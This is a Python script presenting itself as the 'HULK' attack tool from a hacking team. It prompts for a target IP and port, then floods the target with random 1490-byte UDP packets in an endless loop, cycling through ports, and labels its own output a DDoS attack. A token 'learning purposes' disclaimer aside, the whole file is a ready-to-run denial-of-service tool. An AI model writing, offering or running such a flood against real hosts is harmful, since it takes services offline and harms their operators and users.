# Let's import modules
import sys
import os
import time
import socket
import random
import threading
from datetime import datetime

# Optional: For URL validation if using URLs
try:
    from django.core.validators import URLValidator
    from django.core.exceptions import ValidationError
    validate = URLValidator()
except ImportError:
    validate = None

# Get current time
now = datetime.now()
hour, minute, day, month, year = now.hour, now.minute, now.day, now.month, now.year

# Define socket and random bytes
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes_data = random._urandom(1490)

os.system("clear")

# Banner
print('''
    ************************************************
    *            _  _ _   _ _    _  __             *
    *           | || | | | | |  | |/ /             * 
    *           | __ | |_| | |__| ' <              *
    *           |_||_|\___/|____|_|\_\             *
    *                                              *
    *          HTTP Unbearable Load King           *
    *          Author: Jundul Kafa                 *
    *          Team: Bangladesh Cyber Troops (BCT) *
    *                                              *
    ************************************************
    ************************************************
    *                                              *    
    *  [!] Disclaimer :                            *
    *  1. Don't Use For Personal Revenges          *
    *  2. Author/Team Not Responsible For Your Jobs*
    *  3. Use for learning purposes                * 
    *  4. Be ethical!                              *
    ************************************************
''')

# Get target IP and port
ip = input(" [+] Give HULK A Target IP : ")
port = int(input(" [+] Starting Port NO : "))

os.system("clear")
print('''
    ************************************************
    *          HTTP Unbearable Load King           *
    *          Author: Jundul Kafa                 *
    *          Team: Bangladesh Cyber Troops (BCT) *
    ************************************************
''')

# IP validation if Django is available
if validate:
    try:
        validate(ip)
        print(" ✅ Valid IP Checked.... ")
        print(" [+] Attack Screen Loading ....")
    except ValidationError:
        print(" ✘ Input a valid IP or URL")

# Start the attack
print("\n    That's my secret Cap, I am always angry ")
print(f"\n [+] HULK is attacking server {ip}\n")
time.sleep(3)

sent = 0
try:
    while True:
        sock.sendto(bytes_data, (ip, port))
        sent += 1
        print(f"\n [+] Successfully sent {sent} packet to {ip} through port: {port}")
        port = port + 1 if port < 65534 else 1
except KeyboardInterrupt:
    print("\n [-] Ctrl+C Detected... Exiting")
    print(" [-] DDOS ATTACK STOPPED")

input(" Press Enter To Exit")
os.system("clear")
print(" [-] Dr. Banner is tired...")
